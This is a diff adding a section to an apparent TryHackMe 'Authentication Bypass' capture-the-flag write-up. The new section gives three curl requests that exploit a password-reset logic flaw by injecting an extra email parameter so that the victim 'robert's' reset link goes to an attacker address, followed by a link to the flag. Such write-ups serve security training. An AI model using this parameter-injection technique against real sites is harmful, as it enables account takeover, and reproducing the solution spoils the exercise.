@@ -85,6 +85,14 @@ root@ip-10-10-25-193:~#
 ## Task 4 Logic Flaw
 http://machine_ip/customers/reset
 
+`curl 'http://10.10.217.236/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`
+
+`curl 'http://10.10.217.236/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
+
+`curl 'http://10.10.217.236/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=r1skkam@customer.acmeitsupport.thm'`
+
+[What is the flag from Robert's support ticket?](https://github.com/r1skkam/TryHackMe-Authentication-Bypass/blob/main/flag.png)
+
 ## Task 5 Cookie Tampering
 [TryHackMe | HTTP in detail](https://tryhackme.com/room/httpindetail)
 
